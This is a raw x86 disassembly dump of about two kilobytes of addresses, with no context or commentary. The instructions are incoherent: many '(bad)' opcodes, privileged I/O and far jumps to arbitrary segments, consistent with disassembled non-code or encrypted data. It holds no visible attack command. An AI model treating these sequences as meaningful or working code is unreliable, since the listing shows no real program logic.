  41560b:	add    DWORD PTR [eax+eiz*8],esi
  41560e:	add    eax,0xc3aeffa9
  415613:	pop    edi
  415614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415615:	(bad)  
  415617:	pop    ss
  415618:	cmp    al,0xf3
  41561a:	sbb    BYTE PTR [ecx-0x4b10cadc],0xd
  415621:	test   al,0x57
  415623:	pusha  
  415624:	jmp    0x1f53:0xfa81c5ec
  41562b:	lods   eax,DWORD PTR ds:[esi]
  41562c:	test   eax,0xaec5662c
  415631:	repz fwait
  415633:	or     DWORD PTR [ebp+edi*4+0x71],edx
  415637:	and    cl,al
  415639:	xchg   esp,eax
  41563a:	mov    edx,0xb7e66850
  41563f:	inc    ecx
  415640:	iret   
  415641:	adc    dl,al
  415643:	mov    ch,0x65
  415645:	sti    
  415646:	fldcw  WORD PTR [edx+ebp*4]
  415649:	pop    ss
  41564a:	or     dl,BYTE PTR [ebp+0x4f423bae]
  415650:	mov    ecx,0xcb0a6a79
  415655:	jmp    0x8080:0x652c34e9
  41565c:	xchg   edx,eax
  41565d:	ret    0x81d3
  415660:	es or  esi,eax
  415663:	out    0xf7,eax
  415665:	aad    0x5
  415667:	shl    DWORD PTR [eax+0x2f],0x1c
  41566b:	or     bl,bh
  41566d:	loope  0x4156d5
  41566f:	or     bh,BYTE PTR [esi+0xb095fd]
  415675:	retf   
  415676:	jno    0x41569f
  415678:	ds sbb al,0x94
  41567b:	xor    DWORD PTR [eax-0x5a],esp
  41567e:	mov    ebp,0xa58bfceb
  415683:	xchg   ebx,eax
  415684:	ret    
  415685:	fild   QWORD PTR [eax+edi*2]
  415688:	or     al,0x53
  41568a:	jne    0x415619
  41568c:	and    ah,BYTE PTR [ebx]
  41568e:	mov    ebp,0x4a3f5905
  415693:	repz add ah,bh
  415696:	push   ss
  415697:	dec    edx
  415698:	dec    esi
  415699:	scas   al,BYTE PTR es:[edi]
  41569a:	cmc    
  41569b:	sbb    ah,BYTE PTR [eax-0x2a]
  41569e:	dec    ebp
  41569f:	leave  
  4156a0:	xchg   DWORD PTR [edx],esp
  4156a2:	add    ecx,DWORD PTR [edi]
  4156a4:	int    0x52
  4156a6:	repz push es
  4156a8:	ins    DWORD PTR es:[edi],dx
  4156a9:	repnz repz adc BYTE PTR [ebx-0x37],0x33
  4156af:	or     al,0xfa
  4156b1:	mov    BYTE PTR [edx+0x62b7ff6b],bl
  4156b7:	pusha  
  4156b8:	lock xchg esp,eax
  4156ba:	in     al,dx
  4156bb:	inc    edi
  4156bc:	mov    dh,bh
  4156be:	jle    0x415674
  4156c0:	add    al,0x2b
  4156c2:	cld    
  4156c3:	add    ch,BYTE PTR [ebp-0x11]
  4156c6:	pop    eax
  4156c7:	int3   
  4156c8:	pop    eax
  4156c9:	cmovae esi,ebx
  4156cc:	fisttp WORD PTR [eax]
  4156ce:	add    ebx,DWORD PTR [eiz*1+0x10579a21]
  4156d5:	add    eax,0x41aec7fb
  4156da:	test   DWORD PTR [ecx],ecx
  4156dc:	das    
  4156dd:	popa   
  4156de:	cwde   
  4156df:	rcr    DWORD PTR [ebx],0xab
  4156e2:	jl     0x4156e7
  4156e4:	ret    
  4156e5:	mov    dl,0x6e
  4156e7:	or     al,0xad
  4156e9:	adc    DWORD PTR [ecx-0x5b0e5743],ebp
  4156ef:	adc    bl,ch
  4156f1:	neg    cl
  4156f3:	pop    ebx
  4156f4:	sub    esi,ebp
  4156f6:	jb     0x4156f1
  4156f8:	add    esi,esp
  4156fa:	inc    esi
  4156fb:	mov    dl,0x9b
  4156fd:	pop    ds
  4156fe:	sub    BYTE PTR [ebx-0x44],dl
  415701:	mov    al,BYTE PTR [edx]
  415703:	jp     0x4156d9
  415705:	sbb    DWORD PTR [edi+0x7836a599],ebp
  41570b:	cmp    ah,ah
  41570d:	pop    esp
  41570e:	iret   
  41570f:	dec    edi
  415710:	xlat   BYTE PTR ds:[ebx]
  415711:	dec    esi
  415712:	popa   
  415713:	push   0xfffffff9
  415715:	inc    edx
  415716:	neg    DWORD PTR [eax]
  415718:	out    dx,al
  415719:	sub    DWORD PTR [edx],ecx
  41571b:	iret   
  41571c:	adc    DWORD PTR [esi-0x6f],ecx
  41571f:	fmul   QWORD PTR [ebp+0x48]
  415722:	sub    al,0xca
  415724:	mov    dl,BYTE PTR [ecx]
  415726:	ja     0x4156ae
  415728:	dec    eax
  415729:	pusha  
  41572a:	add    ah,bh
  41572c:	xchg   DWORD PTR [esi],esi
  41572e:	scas   al,BYTE PTR es:[edi]
  41572f:	nop
  415730:	stos   BYTE PTR es:[edi],al
  415731:	ret    
  415732:	pusha  
  415733:	jmp    0x2ce6b45e
  415738:	pushf  
  415739:	and    eax,0x318faba5
  41573e:	call   0xd91dc290
  415743:	stos   DWORD PTR es:[edi],eax
  415744:	jmp    0x6a460963
  415749:	scas   eax,DWORD PTR es:[edi]
  41574a:	stc    
  41574b:	bound  esi,QWORD PTR [esi-0x6b963b7a]
  415751:	sahf   
  415752:	push   0xffffffba
  415754:	jp     0x415742
  415756:	xchg   dh,bl
  415758:	and    al,0x2b
  41575a:	pop    esp
  41575b:	or     dh,BYTE PTR [esi-0x11e94ec]
  415761:	jnp    0x4157dd
  415763:	push   ds
  415764:	xor    al,0x6e
  415766:	repnz mov ds:0x9cf6b473,al
  41576c:	daa    
  41576d:	dec    ebx
  41576e:	mov    dl,0x55
  415770:	push   esp
  415771:	js     0x415787
  415773:	jl     0x4157f2
  415775:	bound  edi,QWORD PTR [ebx+eax*1+0xd2a81b2]
  41577c:	sbb    BYTE PTR [edx],bh
  41577e:	xchg   ebx,eax
  41577f:	inc    edx
  415780:	xor    al,0x12
  415782:	pusha  
  415783:	jmp    0x4b204f63
  415788:	mov    eax,0x4f431773
  41578d:	or     bl,BYTE PTR [ebx+0x4fd0ba88]
  415793:	mov    dh,0x7f
  415795:	lods   eax,DWORD PTR ds:[esi]
  415796:	pop    es
  415797:	test   eax,0x92cc89ed
  41579c:	jb     0x415810
  41579e:	and    al,0x94
  4157a1:	jge    0x415782
  4157a3:	xor    BYTE PTR [esi],ah
  4157a5:	jnp    0x4157b8
  4157a7:	int    0x3f
  4157a9:	ret    
  4157aa:	psubsw mm2,mm4
  4157ad:	adc    BYTE PTR [eax],al
  4157af:	jmp    0x8f49:0x2e9e87e3
  4157b6:	xlat   BYTE PTR ds:[ebx]
  4157b7:	push   ecx
  4157b8:	inc    ecx
  4157b9:	test   BYTE PTR ds:0xc4647169,ah
  4157bf:	je     0x4157f9
  4157c1:	pusha  
  4157c2:	jmp    0xb3a5f3ca
  4157c7:	test   ch,cl
  4157c9:	push   es
  4157ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157cb:	mov    ebx,0x7c99a1f5
  4157d0:	(bad)  
  4157d2:	mov    ds:0x3cc9cb65,al
  4157d7:	loop   0x41575f
  4157d9:	push   edx
  4157da:	cld    
  4157db:	sub    DWORD PTR [eax+0x1ea6d25e],esp
  4157e1:	sbb    ebp,DWORD PTR [ebp+0x63]
  4157e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157e5:	sar    ecx,1
  4157e7:	pop    eax
  4157e8:	pop    ss
  4157e9:	loop   0x41583f
  4157eb:	fsub   st(5),st
  4157ed:	repnz nop
  4157ef:	jns    0x4157d2
  4157f1:	cmp    WORD PTR [bp+si+0x3f],0xad6c
  4157f8:	ss or  eax,0x4ea2e335
  4157fe:	outs   dx,DWORD PTR ds:[esi]
  4157ff:	out    dx,al
  415800:	daa    
  415801:	int    0xe
  415803:	push   0x21e06dba
  415808:	mov    eax,DWORD PTR [edi-0x515cd0e6]
  41580e:	pusha  
  41580f:	mov    esp,0xfc9f42df
  415814:	and    eax,0xaaa84bef
  415819:	sub    edi,DWORD PTR [eax]
  41581b:	add    eax,0x9c21fb48
  415820:	aas    
  415821:	loop   0x4157d2
  415823:	dec    ebp
  415824:	ret    
  415825:	push   es
  415826:	ror    BYTE PTR [ecx-0x1982af6b],1
  41582c:	sbb    DWORD PTR [edx-0x1e507404],ecx
  415832:	or     BYTE PTR [ebx+0x40],0xeb
  415836:	in     eax,dx
  415837:	clc    
  415838:	inc    ecx
  415839:	jl     0x41588c
  41583b:	jmp    0x3e03fb1
  415840:	lods   eax,DWORD PTR ds:[esi]
  415841:	sub    eax,0x397e5a68
  415846:	imul   eax,ecx,0xffffffcd
  415849:	jmp    0x92711706
  41584e:	test   BYTE PTR [edi],ah
  415850:	and    eax,0xe7a6afae
  415855:	retf   0x793e
  415858:	inc    ebp
  415859:	sub    al,0x9a
  41585b:	fdiv   QWORD PTR [ebp+eax*2+0x5255bc0e]
  415862:	mov    ebp,0xcc15ec23
  415867:	sbb    al,0xa5
  415869:	cmp    ah,BYTE PTR [ebx+0x70635fde]
  41586f:	pop    esp
  415870:	daa    
  415871:	shl    BYTE PTR [eax-0x7bc1174],cl
  415877:	rol    DWORD PTR [ebp-0x8efe3ee],cl
  41587d:	ret    
  41587e:	addr16 iret 
  415880:	cmp    BYTE PTR [eax],ch
  415882:	test   esp,esi
  415884:	jns    0x41582c
  415886:	fcomi  st,st(6)
  415888:	fnstcw WORD PTR [esi]
  41588a:	add    ebp,ecx
  41588c:	inc    eax
  41588d:	pushf  
  41588e:	in     eax,0xb3
  415890:	shl    DWORD PTR [ecx],cl
  415892:	repz dec ecx
  415894:	icebp  
  415895:	sub    eax,edx
  415897:	pop    ss
  415898:	in     eax,dx
  415899:	cdq    
  41589a:	or     al,bh
  41589c:	cli    
  41589d:	(bad)  [ecx+0x1eb18202]
  4158a3:	cmp    DWORD PTR [ebx-0x6ab4d987],ebx
  4158a9:	inc    edx
  4158aa:	gs inc eax
  4158ac:	and    ebp,DWORD PTR [edx+0x35]
  4158af:	add    BYTE PTR [eax],ch
  4158b1:	test   eax,0xc986e575
  4158b6:	mov    esi,0x6fd09fd7
  4158bb:	xor    al,0xd1
  4158bd:	gs stos DWORD PTR es:[edi],eax
  4158bf:	in     al,0x91
  4158c1:	outs   dx,BYTE PTR ds:[esi]
  4158c2:	xor    ecx,DWORD PTR [ebx]
  4158c4:	add    cl,dh
  4158c6:	cmp    eax,0xdbaa6aaa
  4158cb:	fisttp DWORD PTR [eax-0x36]
  4158ce:	enter  0x15f9,0x30
  4158d2:	div    edi
  4158d4:	pop    ebx
  4158d5:	mov    edi,0xda8f6336
  4158da:	(bad)  
  4158dc:	(bad)  
  4158dd:	xor    dh,bl
  4158df:	std    
  4158e0:	or     eax,0x2abc076a
  4158e5:	scas   eax,DWORD PTR es:[edi]
  4158e6:	jp     0x4158b5
  4158e8:	out    0x3,eax
  4158ea:	inc    ebp
  4158eb:	lahf   
  4158ec:	aam    0x84
  4158ee:	aam    0xba
  4158f0:	sbb    esp,DWORD PTR [ecx+0x5e7220b3]
  4158f6:	cdq    
  4158f7:	test   al,0x79
  4158f9:	and    DWORD PTR [ecx+0x68],ebp
  4158fc:	sub    ecx,DWORD PTR [eax+0x45]
  4158ff:	xor    bl,BYTE PTR [edi+0x78a35153]
  415905:	inc    esi
  415906:	test   BYTE PTR [edx+eax*2-0x2358d84c],dl
  41590d:	or     BYTE PTR [ebx],dh
  41590f:	push   edx
  415910:	xor    al,0xc9
  415912:	(bad)  
  415913:	fldcw  WORD PTR ds:[eax+0x5cf2420b]
  41591a:	pop    eax
  41591b:	jmp    0x62d59731
  415920:	mov    BYTE PTR [edx-0x22],ch
  415923:	retf   
  415924:	das    
  415925:	ss (bad) 
  415927:	sub    ecx,DWORD PTR [esi-0x367fa1d]
  41592d:	xchg   edi,eax
  41592e:	jl     0x4158b3
  415930:	and    DWORD PTR [ebp-0x74a82fc8],ebx
  415936:	or     WORD PTR [edx+0x70],0xb51d
  41593c:	stc    
  41593d:	lea    esp,[ebx+0x7]
  415940:	es dec esp
  415942:	jmp    0x415947
  415944:	aaa    
  415945:	inc    edx
  415946:	xchg   edi,eax
  415947:	jge    0x4158f0
  415949:	lods   al,BYTE PTR ds:[esi]
  41594a:	in     al,dx
  41594b:	call   0xd570:0xf411aa30
  415952:	mov    edi,0xf602a262
  415957:	xchg   ebx,eax
  415958:	mov    eax,ds:0x31bf3ca1
  41595d:	push   es
  41595e:	cs repnz sub al,0x81
  415962:	call   0xa79c:0x11ef1ad8
  415969:	push   ebp
  41596a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41596b:	pop    eax
  41596c:	outs   dx,DWORD PTR ds:[esi]
  41596d:	push   0x1d8e6f0e
  415972:	sti    
  415973:	xor    dl,BYTE PTR [edi+eax*8+0x2ec4045f]
  41597a:	xor    ebx,DWORD PTR [ebp-0x1af53ea6]
  415980:	mov    ah,0xc
  415982:	push   cs
  415983:	ss mov al,0x7e
  415986:	and    BYTE PTR [ebx+0x2a2a55e0],cl
  41598c:	lods   al,BYTE PTR ds:[esi]
  41598d:	xchg   ecx,eax
  41598e:	dec    ecx
  41598f:	cmp    BYTE PTR [ebp-0x69f633f3],0x4
  415996:	push   edx
  415997:	jns    0x415962
  415999:	in     al,dx
  41599a:	jne    0x41596f
  41599c:	into   
  41599d:	dec    ebp
  41599e:	add    edx,DWORD PTR [ebx+0x3c7caeb3]
  4159a4:	cmp    al,0x1c
  4159a6:	push   ss
  4159a7:	pop    edi
  4159a8:	inc    esi
  4159a9:	jg     0x415997
  4159ab:	mov    ch,0x72
  4159ad:	(bad)  [edi-0x69]
  4159b0:	int    0xd9
  4159b2:	or     edx,esi
  4159b4:	mov    dh,0xe2
  4159b6:	xor    ecx,DWORD PTR [ebx+edi*1+0x43]
  4159ba:	sar    DWORD PTR [edx+0x43b015d6],cl
  4159c0:	dec    eax
  4159c1:	jp     0x41598c
  4159c3:	loopne 0x415a21
  4159c5:	add    BYTE PTR [edx-0x1c],dl
  4159c8:	sbb    edi,eax
  4159ca:	fsubr  QWORD PTR [ecx-0xf]
  4159cd:	shl    ecx,0xb0
  4159d0:	fisub  DWORD PTR [ebx+0x30ade2f0]
  4159d6:	outs   dx,BYTE PTR ds:[esi]
  4159d7:	imul   eax,DWORD PTR [esi+edi*4+0x1265febc],0x7facdaa3
  4159e2:	fimul  DWORD PTR [ebp+0x7cc3a96]
  4159e8:	add    DWORD PTR [edi-0x7bee4298],edx
  4159ee:	inc    esp
  4159ef:	clc    
  4159f0:	daa    
  4159f1:	adc    al,0xf4
  4159f3:	jo     0x4159e1
  4159f5:	mov    dl,0x26
  4159f7:	xor    al,0x94
  4159f9:	lahf   
  4159fa:	lahf   
  4159fb:	push   edi
  4159fc:	push   cs
  4159fd:	xchg   ecx,eax
  4159fe:	inc    edx
  4159ff:	and    cl,BYTE PTR [ebp-0x75]
  415a02:	xchg   BYTE PTR [eax],bl
  415a04:	jo     0x415a21
  415a06:	mov    ebp,0x44b212a6
  415a0b:	rcr    DWORD PTR [ecx-0x1f],1
  415a0e:	sub    bh,BYTE PTR [edx-0x12]
  415a11:	out    0x10,al
  415a13:	sbb    edi,ecx
  415a15:	inc    esp
  415a16:	xchg   ecx,esi
  415a18:	mov    esp,0xb9b8af90
  415a1d:	adc    eax,DWORD PTR [ebp+edi*2-0x75]
  415a21:	rcr    bl,cl
  415a23:	dec    eax
  415a24:	jb     0x4159bc
  415a26:	sbb    BYTE PTR [ecx-0x22ece95a],0xa3
  415a2d:	inc    edi
  415a2e:	loopne 0x415a17
  415a30:	pop    edx
  415a31:	xchg   edx,eax
  415a32:	out    dx,al
  415a33:	(bad)  
  415a34:	out    dx,al
  415a35:	push   es
  415a36:	test   BYTE PTR [eax+0x1b85b31a],dl
  415a3c:	adc    BYTE PTR [ebx+0x1e],al
  415a3f:	and    DWORD PTR [edi+0x58],0x1b5d55b6
  415a46:	dec    BYTE PTR [ebp+0x775ae443]
  415a4c:	xor    DWORD PTR [esi+edx*1],esi
  415a4f:	ds mov bl,0xf1
  415a52:	push   esi
  415a53:	mov    esp,0x72003d89
  415a58:	xchg   ecx,eax
  415a59:	push   ebp
  415a5a:	push   ebx
  415a5b:	or     eax,0x75e067fb
  415a60:	lods   eax,DWORD PTR ds:[esi]
  415a61:	jg     0x415a03
  415a63:	jle    0x415a56
  415a65:	int    0x19
  415a67:	dec    eax
  415a68:	shl    ebp,cl
  415a6a:	mov    ecx,0xd159278b
  415a6f:	adc    BYTE PTR [esi],dl
  415a71:	fild   WORD PTR [eax+0x2f60bac5]
  415a77:	imul   esp,esp,0xffffff8c
  415a7a:	fwait
  415a7b:	jne    0x415a24
  415a7d:	adc    dh,BYTE PTR [ebx-0x10]
  415a80:	sub    bh,bl
  415a82:	pop    ss
  415a83:	add    eax,0x2843bc72
  415a88:	jne    0x415ad1
  415a8a:	arpl   sp,bx
  415a8c:	push   es
  415a8d:	jne    0x415aef
  415a8f:	loopne 0x415a24
  415a91:	jmp    0x415a8e
  415a93:	push   eax
  415a94:	neg    DWORD PTR [edx]
  415a96:	pop    edx
  415a97:	shl    ebp,0x8d
  415a9a:	test   eax,0x588d427f
  415a9f:	cmp    ch,bh
  415aa1:	xchg   edx,eax
  415aa2:	adc    bh,BYTE PTR [ebp-0x13487ee0]
  415aa8:	push   eax
  415aa9:	loopne 0x415a48
  415aab:	xor    bl,al
  415aad:	mov    ebp,0x1a1d9548
  415ab2:	jne    0x415a41
  415ab4:	scas   eax,DWORD PTR es:[edi]
  415ab5:	bound  esi,QWORD PTR [ebx]
  415ab7:	mov    ecx,0x63d7298b
  415abc:	adc    al,0x52
  415abe:	sbb    BYTE PTR [si-0x5ed9],al
  415ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ac5:	add    BYTE PTR [ecx-0x4198e2bc],dl
  415acb:	js     0x415a63
  415acd:	test   eax,0x7506081a
  415ad2:	mov    eax,ds:0xb377c31d
  415ad7:	jmp    0xbe99:0x585e75d4
  415ade:	cmp    DWORD PTR [eax],esi
  415ae0:	popa   
  415ae1:	jbe    0x415a98
  415ae3:	inc    esp
  415ae4:	in     al,dx
  415ae5:	push   ecx
  415ae6:	cmc    
  415ae7:	xor    eax,0xf18c7f03
  415aec:	xchg   ebx,eax
  415aed:	and    edi,esi
  415aef:	ret    0x4edf
  415af2:	pop    ebp
  415af3:	sbb    bh,BYTE PTR [ecx+0x7e]
  415af6:	lods   al,BYTE PTR ds:[esi]
  415af7:	sub    DWORD PTR [edi],0x7b16027b
  415afd:	lock scas al,BYTE PTR es:[edi]
  415aff:	dec    ebp
  415b00:	sbb    al,0xff
  415b02:	xchg   BYTE PTR [esi],bl
  415b04:	jb     0x415b5b
  415b06:	jecxz  0x415a9a
  415b08:	retf   
  415b09:	inc    esi
  415b0a:	or     edi,DWORD PTR [ebx]
  415b0c:	push   ecx
  415b0d:	push   edx
  415b0e:	rcr    DWORD PTR [edi],cl
  415b10:	cli    
  415b11:	lock pop ebp
  415b13:	xlat   BYTE PTR ds:[ebx]
  415b14:	and    al,0xf1
  415b16:	dec    esp
  415b17:	mov    bl,0xc7
  415b19:	or     ebx,edi
  415b1b:	bound  ecx,QWORD PTR [eax-0x6dbbd196]
  415b21:	pop    ss
  415b22:	mov    eax,ds:0xd6c38c75
  415b27:	loopne 0x415af9
  415b29:	cmp    bl,BYTE PTR [edx]
  415b2b:	add    cl,BYTE PTR [eax+0x0]
  415b2e:	sbb    eax,0x8d57bfb5
  415b33:	push   eax
  415b34:	pop    ecx
  415b35:	outs   dx,BYTE PTR ds:[esi]
  415b36:	outs   dx,DWORD PTR ds:[esi]
  415b37:	mov    ebp,0xcef3322a
  415b3c:	lds    esp,FWORD PTR [ebp+0x5e]
  415b3f:	pushf  
  415b40:	enter  0xb6dc,0x15
  415b44:	adc    ebx,ecx
  415b46:	aas    
  415b47:	repz fwait
  415b49:	mov    ebp,0x812bc4bf
  415b4e:	inc    edi
  415b4f:	retf   
  415b50:	ins    BYTE PTR es:[edi],dx
  415b51:	hlt    
  415b52:	(bad)
  415b56:	push   0xfffffff7
  415b58:	fdiv   DWORD PTR [ebx]
  415b5a:	dec    esi
  415b5b:	jb     0x415aee
  415b5d:	jo     0x415b82
  415b5f:	(bad)  
  415b60:	fsub   st,st(2)
  415b62:	repz push cs
  415b64:	pop    ss
  415b65:	inc    ebx
  415b66:	mov    bl,0x59
  415b68:	push   ecx
  415b69:	mov    esi,DWORD PTR [ebp-0x6f]
  415b6c:	sbb    eax,0xd08d89d0
  415b71:	adc    DWORD PTR [esi+edi*4],esp
  415b74:	aad    0x31
  415b76:	and    DWORD PTR [edx-0x6d],edi
  415b79:	jno    0x415b41
  415b7b:	call   0x5ddbcdd6
  415b80:	xor    ebx,DWORD PTR ds:0xb2168840
  415b86:	call   0x21c0:0x3f93c5b9
  415b8d:	(bad)  
  415b8e:	adc    eax,ebx
  415b90:	xor    ebp,DWORD PTR ds:0xaef8679c
  415b96:	pop    es
  415b97:	pop    ebx
  415b98:	mov    esi,0x30c56241
  415b9d:	mov    eax,ds:0xe6e4aefb
  415ba2:	test   eax,0xf42d2a27
  415ba7:	(bad)  
  415ba8:	mov    dl,0xc5
  415baa:	xchg   esi,eax
  415bab:	jle    0x415b68
  415bad:	mov    edx,0xc6899902
  415bb2:	aam    0x35
  415bb4:	xchg   esp,eax
  415bb5:	fnsave [edx+ebx*2]
  415bb8:	pop    ebp
  415bb9:	or     ecx,DWORD PTR [ebx+0x76]
  415bbc:	push   es
  415bbd:	scas   al,BYTE PTR es:[edi]
  415bbe:	jae    0x415bed
  415bc0:	and    bh,BYTE PTR [esi+edx*4-0x6b76ebb7]
  415bc7:	jecxz  0x415ba5
  415bc9:	xor    al,0xb0
  415bcb:	and    al,0xfa
  415bcd:	pushf  
  415bce:	cli    
  415bcf:	test   DWORD PTR [edi+esi*2],edx
  415bd2:	and    eax,0x9a999675
  415bd7:	cmp    ah,bl
  415bd9:	loope  0x415bbf
  415bdb:	push   0x21bb9fb3
  415be0:	jmp    0xdc8b:0x1dad9d6f
  415be7:	cli    
  415be8:	int3   
  415be9:	cmp    al,0xf9
  415beb:	add    eax,0x97b1b09e
  415bf0:	mul    BYTE PTR [esi+0x7bd49f5e]
  415bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf7:	sbb    DWORD PTR [eax+0x4e],ebp
  415bfa:	outs   dx,BYTE PTR ds:[esi]
  415bfb:	call   0xe42e4feb
  415c00:	jmp    0x3de7ae7e
  415c05:	pop    ecx
  415c06:	mov    cl,0x5c
  415c08:	fucomi st,st(0)
  415c0a:	add    ebp,DWORD PTR [edx-0xa]
  415c0d:	lods   al,BYTE PTR ds:[esi]
  415c0e:	js     0x415b9b
  415c10:	xor    cl,BYTE PTR [ecx+0x30843dfc]
  415c16:	dec    edi
  415c17:	retf   
  415c18:	lods   al,BYTE PTR ds:[esi]
  415c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c1a:	loope  0x415c95
  415c1c:	fisubr DWORD PTR [edx-0x80]
  415c1f:	adc    dl,ah
  415c21:	sub    DWORD PTR cs:[esi-0x38],eax
  415c25:	mov    BYTE PTR [esi-0x4b83cd3f],al
  415c2b:	mov    ah,0xe9
  415c2d:	mov    cl,0x4c
  415c2f:	sbb    BYTE PTR [eax],ah
  415c31:	and    al,0x67
  415c33:	or     BYTE PTR [ebx+edi*8],bl
  415c36:	sbb    ecx,DWORD PTR [eax+0xfcbfb83]
  415c3c:	xchg   ecx,eax
  415c3d:	pop    ebx
  415c3e:	push   es
  415c3f:	in     al,dx
  415c40:	rcr    DWORD PTR [eax+0x1baa57ef],1
  415c46:	xlat   BYTE PTR ds:[ebx]
  415c47:	cld    
  415c48:	and    edx,DWORD PTR [ebx-0x28]
  415c4b:	push   0xabf981da
  415c50:	push   0xadfbbb44
  415c55:	stc    
  415c56:	test   esi,ecx
  415c58:	out    0xe7,eax
  415c5a:	xchg   esi,eax
  415c5b:	das    
  415c5c:	adc    al,0x15
  415c5e:	sbb    eax,0x237e19e6
  415c63:	mov    ds:0x6b800edd,al
  415c68:	das    
  415c69:	jbe    0x415cd5
  415c6b:	imul   eax,DWORD PTR [edx-0x10],0x1acea195
  415c72:	cmp    edx,DWORD PTR [esi+eiz*8-0x1a]
  415c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c77:	lods   eax,DWORD PTR ds:[esi]
  415c78:	call   0x9b85:0xc0922056
  415c7f:	mov    bh,0x46
  415c81:	push   ebp
  415c82:	add    eax,0xe06ce137
  415c87:	xchg   ecx,eax
  415c88:	xchg   esp,eax
  415c89:	retf   0xa87b
  415c8c:	mov    cl,0x4a
  415c8e:	sbb    esi,eax
  415c90:	xor    esi,DWORD PTR [eax+0x9]
  415c93:	or     eax,0x5030af6b
  415c98:	ret    0x1a95
  415c9b:	dec    ebp
  415c9c:	stos   BYTE PTR es:[edi],al
  415c9d:	xor    dl,BYTE PTR ds:0x6236b852
  415ca3:	push   0x132187be
  415ca8:	adc    edi,DWORD PTR [esi-0x2667602]
  415cae:	add    bl,BYTE PTR [edx+0x43]
  415cb1:	add    DWORD PTR [esi+0x60],0xffffffbc
  415cb5:	lea    esi,[esi]
  415cb7:	pop    esi
  415cb8:	nop
  415cb9:	inc    esi
  415cba:	add    eax,0x6cb40ee9
  415cbf:	ror    DWORD PTR [edi],1
  415cc1:	sub    esi,ecx
  415cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cc4:	sahf   
  415cc5:	pop    es
  415cc6:	jno    0x415d32
  415cc8:	scas   eax,DWORD PTR es:[edi]
  415cc9:	mov    dl,BYTE PTR [edi]
  415ccb:	or     eax,ebx
  415ccd:	into   
  415cce:	jp     0x415cd8
  415cd0:	dec    ecx
  415cd1:	add    eax,0xd7c148ea
  415cd6:	out    dx,al
  415cd7:	mov    eax,0x38715a64
  415cdc:	cmp    eax,0x65c62d1d
  415ce1:	lods   eax,DWORD PTR ds:[esi]
  415ce2:	jmp    0x4bc72325
  415ce7:	push   ss
  415ce8:	lock js 0x415c84
  415ceb:	xchg   ecx,eax
  415cec:	(bad)  
  415ced:	mov    dl,0x6b
  415cef:	cwde   
  415cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cf1:	mov    edi,0x4aa6d7bc
  415cf6:	mov    cl,0x2c
  415cf8:	sbb    BYTE PTR [esi],ch
  415cfa:	mov    al,0x91
  415cfc:	scas   eax,DWORD PTR es:[edi]
  415cfd:	sub    al,0x5e
  415cff:	xchg   esi,eax
  415d00:	das    
  415d01:	icebp  
  415d02:	sub    BYTE PTR ds:0xf4a19b97,dl
  415d08:	es aam 0x78
  415d0b:	fldenv [edi+0x17]
  415d0e:	pop    ebp
  415d0f:	loope  0x415cdf
  415d11:	mov    BYTE PTR [edi-0x563ce7f8],ch
  415d17:	jle    0x415d36
  415d19:	mov    BYTE PTR [ebp+0x6da214c9],cl
  415d1f:	cmp    eax,0xd29e3fd7
  415d24:	test   BYTE PTR [eax],ah
  415d26:	mov    dl,0xc2
  415d28:	and    al,0xe7
  415d2a:	inc    esp
  415d2b:	sub    edx,DWORD PTR [ebp+0x1c]
  415d2e:	gs push ebx
  415d30:	mov    edi,DWORD PTR [edi]
  415d32:	fwait
  415d33:	xchg   BYTE PTR ds:0x59bd84fc,cl
  415d39:	dec    esp
  415d3a:	lds    esp,FWORD PTR [edx]
  415d3c:	in     al,0x2f
  415d3e:	scas   eax,DWORD PTR es:[edi]
  415d3f:	add    BYTE PTR ss:[eax],0xb6
  415d43:	lea    esp,[edi+ecx*8+0x2fa4e228]
  415d4a:	jne    0x415d4b
  415d4c:	dec    ecx
  415d4d:	add    cl,BYTE PTR [eax]
  415d4f:	mov    al,0xeb
  415d51:	jbe    0x415dce
  415d53:	pop    esp
  415d54:	fisttp WORD PTR [ecx+0x41d0d78c]
  415d5a:	rol    BYTE PTR [eax+0x0],cl
  415d5d:	test   al,0x9c
  415d5f:	sbb    DWORD PTR [eax+esi*4],esp
  415d62:	jns    0x415daa
  415d64:	add    bh,BYTE PTR [eax]
  415d66:	icebp  
  415d67:	pop    es
  415d68:	leave  
  415d69:	enter  0xa32f,0x57
  415d6d:	iret   
  415d6e:	and    cl,BYTE PTR [ebp+0x18888ed2]
  415d74:	fcmovnb st,st(3)
  415d76:	sub    eax,0xfb1521d3
  415d7b:	pop    ss
  415d7c:	add    BYTE PTR [edi],bl
  415d7e:	inc    ebp
  415d7f:	out    dx,al
  415d80:	pop    edx
  415d81:	icebp  
  415d82:	and    al,0xa
  415d84:	xor    dh,ch
  415d86:	push   esp
  415d87:	std    
  415d88:	lea    esi,[edi-0x4a158481]
  415d8e:	call   0x2d04:0xf16bf5e0
  415d95:	or     eax,0xe1fbc580
  415d9a:	fmul   QWORD PTR [esi-0x7c]
  415d9d:	lock clc 
  415d9f:	(bad)  
  415da0:	jo     0x415d6c
  415da2:	mov    cs,ecx
  415da4:	(bad)  
  415da5:	xor    edx,DWORD PTR [esi]
  415da7:	lods   al,BYTE PTR ds:[esi]
  415da8:	adc    al,0xd
  415daa:	mov    ds:0x44866f44,eax
  415daf:	ret    0xfb5b
  415db2:	daa    
  415db3:	cwde   
  415db4:	mov    dh,0xfb
  415db6:	or     edx,esp
  415db8:	js     0x415db7
  415dba:	dec    edx
  415dbb:	xchg   ebx,eax
  415dbc:	xchg   ebp,eax
  415dbd:	mov    eax,ds:0xf4a2036c
  415dc2:	push   edi
  415dc3:	push   0xffffff84
  415dc5:	sub    bh,ah
  415dc7:	dec    ebp
  415dc8:	cmp    DWORD PTR [edx+eiz*4],eax
  415dcb:	repz xor eax,0x254904fe
  415dd1:	sub    al,0xdb
  415dd3:	pop    ebp
  415dd4:	ret    0xcfde
  415dd7:	ror    BYTE PTR [ebp+0x5665287f],0x22
